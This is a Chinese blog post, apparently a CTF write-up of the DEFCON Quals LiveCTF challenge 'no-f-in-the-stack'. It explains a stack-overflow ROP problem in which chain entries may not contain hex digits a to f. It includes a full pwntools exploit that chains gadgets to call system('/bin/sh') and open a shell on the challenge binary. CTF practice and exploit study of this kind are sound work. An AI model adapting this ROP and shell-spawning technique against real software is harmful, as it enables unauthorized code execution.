---
date: 2025-05-14 10:21:56
layout: post
title: DEFCON Quals LiveCTF writeup
subtitle: 
description: >-
    之前一直是队友做 gadget 题，导致 Rosayxy 这块非常缺乏练习，在本次比赛中尝到了血的教训
image: >-
  /assets/img/uploads/cat_asleep.jpg
optimized_image: >-
  /assets/img/uploads/cat_asleep.jpg
category: ctf
tags:
  - pwn
  - gadgets
author: rosayxy
paginate: true
---
这次是 Rosayxy 首打 defcon quals！    
嗯 其实感觉至少 liveCTF 这块没有想象中的难，至少题目都还能逆，然后也都有思路，也没有像 SECCON FINAL/今年阿里云CTF 里面一些完全没思路的题    
当然能不能在规定时间做出来就是另一码事了（流泪）   
LiveCTF 是有6场，每场限时4h，安排如下：   
![alt_text](/assets/img/uploads/livectf_schedule.jpg)

对于 LiveCTF 评价如下，图为打完之后的吐槽，确实最后一道 gadget 题感觉放大水了，但是确实思路没想到（问题在我，之前一直感觉 gadget 题很 dirty 而且不太好玩，所以复现的时候偷懒，而且比赛的时候基本都是队友做...这次终于尝到了血的教训，流泪）         


![alt_text](/assets/img/uploads/livectf_sad.png)     

## Chall 6 - no-f-in-the-stack
没错，这就是那个 gadget 题目   
给了一个栈溢出，要求是 ropchain 里面所有项的 hex 表示没有 a - f 的字符，具体限制是用 `scanf("%lu",...)` 读入 ropchain 中的一项，然后用 `sscanf(printed_addr, "%lx", &stack[i])` 的方法，把 dec 当成 hex 解析然后输出到栈上   

它 `system` 和 `/bin/sh` 的地址都给出了，但是当时没往 `system("/bin/sh")` 的方向想，是因为 `/bin/sh` 的地址是 0x4A04F9，感觉绕不过去 orz   

然后就在尝试在栈上写 `sh\x00` 然后把 rdi 指向它，我们从 main 返回时 rdi 指向栈的较低地址，从而需要找 gadget 升栈   
尝试的方法是把 rsi 控制成升栈的大小，然后用 `add edi, esi` 来升栈    
**但是**，`add edi, esi` 指令会清除掉 edi 的高位，所以 rdi 此时也不是栈地址，所以就 gg 了    

### writeup
nu1l 战队的方法如下，参考 [youtube 的讲解](https://www.youtube.com/live/5Pr7JL89ZV4?si=2V1lwVVoF_I1aTyv)    
大概方法是有 `add rax, rdi; ret` 的 gadget，分两次把 rax 加成 `/bin/sh` 的地址，然后用 `mov rdi, rax; call system` 来调用 system 即可      
```py
from pwn import*
pop_rdi_rbp_ret = 402218
pop_rsi_r15_rbp_ret = 402216
call_system = 401917
system_rax = 401914 # mov rdi, rax; call system
ret = 401965
call_read = 416157 # 需要 rdi + 0x74 是2 这样就可以避免syscall 传参数之类的了
mov_rax_rsi = 405186
deref_rax_ret = 482601
add_edi_esi = 493943 # add edi, esi ; add eax, dword ptr [rax] ; ret
add_rax_rdi = 471885

context(log_level = "debug", arch = "amd64", os = "linux")
p = process("./challenge")
for i in range(5):
    p.recvuntil("Addr pls: ")
    p.sendline(str(300000000)) # 不然 i 会被改掉 就不知道写在啥地方去了

binshell = 0x4A04F9
binshell_1 = 250489
binshell_2 = 250070

payload = [pop_rdi_rbp_ret, binshell_1, 1, add_rax_rdi, pop_rdi_rbp_ret, binshell_2, 1, add_rax_rdi, system_rax]

for i in payload:
    p.recvuntil("Addr pls: ")
    p.sendline(str(i))

# gdb.attach(p,"b* 0x0401A54")
# pause()
p.recvuntil("Addr pls: ") # trigger return
p.sendline("0")

p.interactive()
```

## Chall 5 - TODO
最近忙着一些其他事情 ~ 有时间一定好好复现    
